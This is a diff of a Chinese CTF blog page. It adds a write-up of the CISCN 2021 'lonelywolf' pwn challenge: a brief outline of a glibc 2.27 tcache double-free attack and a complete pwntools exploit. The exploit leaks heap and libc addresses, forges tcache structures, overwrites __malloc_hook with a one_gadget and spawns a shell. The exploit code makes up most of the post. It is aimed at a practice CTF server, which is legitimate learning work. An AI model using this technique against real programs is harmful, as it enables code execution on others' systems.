@@ -76,6 +76,107 @@
     <div class="article-wrap">
         
             <h2 class="article-title cl">
+                <a href="/2025/04/20/具有key的高版本tcache-attack初体验/" title="具有key的高版本tcache attack初体验">
+                    具有key的高版本tcache attack初体验
+                </a>
+            </h2>
+        
+
+        <ul class="article-extra" style="margin-bottom: 20px">
+            
+            <li class="article-time">
+                2025-04-20
+            </li>
+            
+
+            
+                
+            
+
+
+        </ul>
+        <div class="article-description">
+            
+            <blockquote>
+<p>Problem: <a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/856">[CISCN 2021 初赛]lonelywolf</a></p>
+</blockquote>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>先double free拿到chunk地址<br>要点是libc2.27后期有key 需要先清空fd<br>泄露了可以拿到tcache_pthread_struct<br>然后改idx为7认为满了 释放tcache_pthread_struct 然后拿到main_arena 得到Libc_base<br>然后修复一下结构 比如0x80的idx 和0x80对应chunk的地址改成malloc_hook - 0x17 这个的size位是7d可以用<br>然后就写脏数据到__malloc_hook<br>写一个One_gadget 然后直接调用malloc完成getshell</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="hljs python">  <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+p = remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28937</span>)
+<span class="hljs-comment">#p = process(&quot;./lonelywolf&quot;)</span>
+e = ELF(<span class="hljs-string">&#x27;./lonelywolf&#x27;</span>)
+libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">idx,size</span>):
+    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
+    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))
+    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):
+    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
+    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))
+    p.sendlineafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
+    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))
+    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):
+    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))
+    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))
+
+new(<span class="hljs-number">0</span>,<span class="hljs-number">0x78</span>)
+free(<span class="hljs-number">0</span>)
+edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span>) <span class="hljs-comment">#清掉fd bk 有key不能double free</span>
+free(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">0</span>)
+p.recvuntil(<span class="hljs-string">b&quot;Content: &quot;</span>)
+heap_address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+log.success(<span class="hljs-string">&quot;leak head_address=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(heap_address))
+tcache_struct_addr = heap_address &amp; <span class="hljs-number">0xFFFFFFFFF000</span> <span class="hljs-comment">#拿到结构地址</span>
+log.success(<span class="hljs-string">&quot;leak tcache_struct_addr=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(tcache_struct_addr))
+edit(<span class="hljs-number">0</span>,p64(tcache_struct_addr+<span class="hljs-number">0x10</span>)) <span class="hljs-comment">#改fd成结构地址</span>
+new(<span class="hljs-number">0</span>,<span class="hljs-number">0x78</span>)
+new(<span class="hljs-number">0</span>,<span class="hljs-number">0x78</span>)
+edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0x7000000</span>)) <span class="hljs-comment">#让idx变成7 认为满了</span>
+free(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">0</span>)
+p.recvuntil(<span class="hljs-string">b&quot;Content: &quot;</span>)
+libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]
+malloc = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]
+log.success(<span class="hljs-string">&quot;leak libc_base=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))
+log.success(<span class="hljs-string">&quot;leak malloc=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(malloc))
+edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0x1000000000000</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">13</span>+p64(libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] - <span class="hljs-number">0x17</span>)) <span class="hljs-comment">#0x17 size位7d 可以用 (恢复idx为1的0x80字段) + padding + malloc_hook的fake chunk 地址</span>
+new(<span class="hljs-number">0</span>,<span class="hljs-number">0x78</span>)
+og=[<span class="hljs-number">0x10a41c</span>,<span class="hljs-number">0x4f302</span>,<span class="hljs-number">0xe54f7</span>,<span class="hljs-number">0xe54fe</span>,<span class="hljs-number">0xe5502</span>,<span class="hljs-number">0x10a2fc</span>,<span class="hljs-number">0x10a308</span>]
+edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x17</span>+p64(libc_base+og[<span class="hljs-number">0</span>]))
+new(<span class="hljs-number">0</span>,<span class="hljs-number">0x78</span>)
+<span class="hljs-comment">#attach(p)</span>
+p.interactive()</code></pre>
+
+
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>对该题的考点总结</li>
+</ul>
+
+        </div>
+        
+            
+        
+        
+    </div>
+</article>
+
+        
+            
+            <article class="article">
+    <div class="article-wrap">
+        
+            <h2 class="article-title cl">
                 <a href="/2025/04/20/ret2csu-第一次解答/" title="ret2csu 第一次解答">
                     ret2csu 第一次解答
                 </a>
@@ -779,14 +880,14 @@ p.interactive()</code></pre>
         
         <div class="widget-post widget" style="order: 1 ">
             <h2 class="widget-title"><i class="fa fa-file-text"></i> 近期文章</h2>
-            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/04/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-2022-happy-note-%E9%AB%98%E7%89%88%E6%9C%ACglibc-IO-FILE%E5%88%9D%E6%8E%A2/">[巅峰极客 2022]happy note - 高版本glibc _IO_FILE初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/23/pwngdb%E8%A7%A3%E5%86%B3%E6%9B%B4%E6%8D%A2libc%E5%90%8E%E4%B8%8D%E5%8A%A0%E8%BD%BD%E7%AC%A6%E5%8F%B7-IO-FILE%E7%AD%89%E7%BB%93%E6%9E%84%E6%B2%A1%E6%9C%89%E7%AC%A6%E5%8F%B7%E7%9A%84%E9%97%AE%E9%A2%98/">pwngdb解决更换libc后不加载符号/_IO_FILE等结构没有符号的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/21/SUCTF-2018-%E6%8B%9B%E6%96%B0%E8%B5%9B-unlink/">[SUCTF 2018 招新赛]unlink</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2023-%E5%86%B3%E8%B5%9B-Printf-but-not-fmtstr/">[羊城杯 2023 决赛]Printf but not fmtstr</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/ORW2/">ORW2</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E7%AE%80%E5%8D%95ORW%E5%88%9D%E6%8E%A2/">简单ORW初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/2-34-%E9%AB%98%E7%89%88%E6%9C%AClibc-safe-linking-%E5%88%9D%E4%BD%93%E9%AA%8C-%E8%A2%AB%E6%81%B6%E5%BF%83%E6%AD%BB%E4%BA%86/">2.34 高版本libc safe-linking 初体验 (被恶心死了)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E5%85%A5%E9%97%A8%E7%9A%84UAF/">入门的UAF</a></li></ul>
+            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/04/23/2021-%E9%95%BF%E5%9F%8E%E6%9D%AF-%E9%99%A2%E6%A0%A1%E7%BB%84-K1ng-in-h3ap-I-stdout%E6%B3%84%E9%9C%B2libc%E5%88%9D%E6%8E%A2/">[2021 长城杯_院校组]K1ng_in_h3ap_I - stdout泄露libc初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-2022-happy-note-%E9%AB%98%E7%89%88%E6%9C%ACglibc-IO-FILE%E5%88%9D%E6%8E%A2/">[巅峰极客 2022]happy note - 高版本glibc _IO_FILE初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/23/pwngdb%E8%A7%A3%E5%86%B3%E6%9B%B4%E6%8D%A2libc%E5%90%8E%E4%B8%8D%E5%8A%A0%E8%BD%BD%E7%AC%A6%E5%8F%B7-IO-FILE%E7%AD%89%E7%BB%93%E6%9E%84%E6%B2%A1%E6%9C%89%E7%AC%A6%E5%8F%B7%E7%9A%84%E9%97%AE%E9%A2%98/">pwngdb解决更换libc后不加载符号/_IO_FILE等结构没有符号的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/21/SUCTF-2018-%E6%8B%9B%E6%96%B0%E8%B5%9B-unlink/">[SUCTF 2018 招新赛]unlink</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2023-%E5%86%B3%E8%B5%9B-Printf-but-not-fmtstr/">[羊城杯 2023 决赛]Printf but not fmtstr</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/ORW2/">ORW2</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E7%AE%80%E5%8D%95ORW%E5%88%9D%E6%8E%A2/">简单ORW初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/2-34-%E9%AB%98%E7%89%88%E6%9C%AClibc-safe-linking-%E5%88%9D%E4%BD%93%E9%AA%8C-%E8%A2%AB%E6%81%B6%E5%BF%83%E6%AD%BB%E4%BA%86/">2.34 高版本libc safe-linking 初体验 (被恶心死了)</a></li></ul>
         </div>
         
 
         
         <div class="widget-tags widget" style="order: 2 ">
             <h2 class="widget-title"><i class="fa fa-tags"></i> 标签</h2>
-            <a href="/tags/IO-file/" style="font-size: 10px;">IO_file</a> <a href="/tags/IO-FILE/" style="font-size: 10px;">_IO_FILE</a> <a href="/tags/malloc-hook/" style="font-size: 12px;">_malloc_hook</a> <a href="/tags/debug-symbol/" style="font-size: 10px;">debug-symbol</a> <a href="/tags/glibc/" style="font-size: 16px;">glibc</a> <a href="/tags/heap/" style="font-size: 18px;">heap</a> <a href="/tags/heap-feng-shui/" style="font-size: 10px;">heap_feng_shui</a> <a href="/tags/house-of-apple2/" style="font-size: 10px;">house of apple2</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 12px;">orw</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwngdb/" style="font-size: 10px;">pwngdb</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 12px;">shellcode</a> <a href="/tags/stack/" style="font-size: 12px;">stack</a> <a href="/tags/tcache/" style="font-size: 14px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unlink/" style="font-size: 12px;">unlink</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 12px;">世界杯</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a> <a href="/tags/%E8%A7%A3%E5%86%B3/" style="font-size: 10px;">解决</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%97%AE%E9%A2%98/" style="font-size: 10px;">问题</a>
+            <a href="/tags/IO-file/" style="font-size: 10px;">IO_file</a> <a href="/tags/IO-FILE/" style="font-size: 10px;">_IO_FILE</a> <a href="/tags/IO-FILEt/" style="font-size: 10px;">_IO_FILEt</a> <a href="/tags/malloc-hook/" style="font-size: 12px;">_malloc_hook</a> <a href="/tags/debug-symbol/" style="font-size: 10px;">debug-symbol</a> <a href="/tags/fastbin/" style="font-size: 10px;">fastbin</a> <a href="/tags/glibc/" style="font-size: 16px;">glibc</a> <a href="/tags/heap/" style="font-size: 18px;">heap</a> <a href="/tags/heap-feng-shui/" style="font-size: 10px;">heap_feng_shui</a> <a href="/tags/house-of-apple2/" style="font-size: 10px;">house of apple2</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 12px;">orw</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwngdb/" style="font-size: 10px;">pwngdb</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 12px;">shellcode</a> <a href="/tags/stack/" style="font-size: 12px;">stack</a> <a href="/tags/stdout/" style="font-size: 10px;">stdout</a> <a href="/tags/tcache/" style="font-size: 14px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unlink/" style="font-size: 12px;">unlink</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 12px;">世界杯</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a> <a href="/tags/%E8%A7%A3%E5%86%B3/" style="font-size: 10px;">解决</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%97%AE%E9%A2%98/" style="font-size: 10px;">问题</a>
         </div>
         
 
